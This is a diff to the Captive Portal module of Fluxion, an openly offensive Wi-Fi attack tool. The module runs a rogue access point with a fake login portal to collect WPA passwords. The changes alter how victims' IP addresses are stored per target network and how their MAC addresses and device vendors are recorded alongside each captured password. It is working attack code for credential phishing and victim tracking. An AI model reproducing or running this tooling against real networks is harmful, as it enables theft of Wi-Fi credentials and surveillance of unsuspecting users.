@@ -5,7 +5,6 @@ CaptivePortalState="Not Ready"
 
 CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
 CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"
-CaptivePortalMacLog="$FLUXIONPath/attacks/Captive Portal/netlog/"
 CaptivePortalJamTime="9999999999999"
 
 CaptivePortalAuthenticationMethods=("hash") # "wpa_supplicant")
@@ -347,8 +346,10 @@ function captive_portal_unset_attack() {
 }
 
 function captive_portal_get_client_IP() {
-	if [ -f "$FLUXIONWorkspacePath/ip_hits" ]; then
-		MatchedClientIP=$(cat "$FLUXIONWorkspacePath/ip_hits" | tail -n 1 | head -n 1)
+	touch "$CaptivePortalPassLog/${APTargetSSIDClean//"/"}-$APTargetMAC-IP.log"
+
+	if [ -f "$CaptivePortalPassLog/${APTargetSSIDClean//"/"}-$APTargetMAC-IP.log" ]; then
+		MatchedClientIP=$(cat "$CaptivePortalPassLog/${APTargetSSIDClean//"/"}-$APTargetMAC-IP.log" | sed '/^\s*$/d' | tail -n 1 | head -n 1)
 	else
 		MatchedClientIP="unknown"
 	fi
@@ -357,9 +358,9 @@ function captive_portal_get_client_IP() {
 }
 
 function captive_portal_get_IP_MAC() {
-	if [ -f "$FLUXIONWorkspacePath/ip_hits" ] && [ $(captive_portal_get_client_IP) != "" ]; then
+	if [ -f "$CaptivePortalPassLog/${APTargetSSIDClean//"/"}-$APTargetMAC-IP.log" ] && [ $(captive_portal_get_client_IP) != "" ] && [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
 		IP=$(captive_portal_get_client_IP)
-		MatchedClientMAC=$(nmap -PR -sn -n $IP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
+		MatchedClientMAC=$(cat $FLUXIONWorkspacePath/clients.txt | grep $IP | awk '{print $5}' | grep : | head -n 1 | tr [:upper:] [:lower:])
 		if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
 			MatchedClientMAC="xx:xx:xx:xx:xx:xx"
 		fi
@@ -646,6 +647,13 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
 	fi
+
+	if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
+		cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC-IP.log\"
+		echo \" \" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC-IP.log\"
+		echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
+	fi
+
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
@@ -738,7 +746,7 @@ Channel: $APTargetChannel
 Security: $APTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
-Mac: $(captive_portal_get_IP_MAC)
+Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
 IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
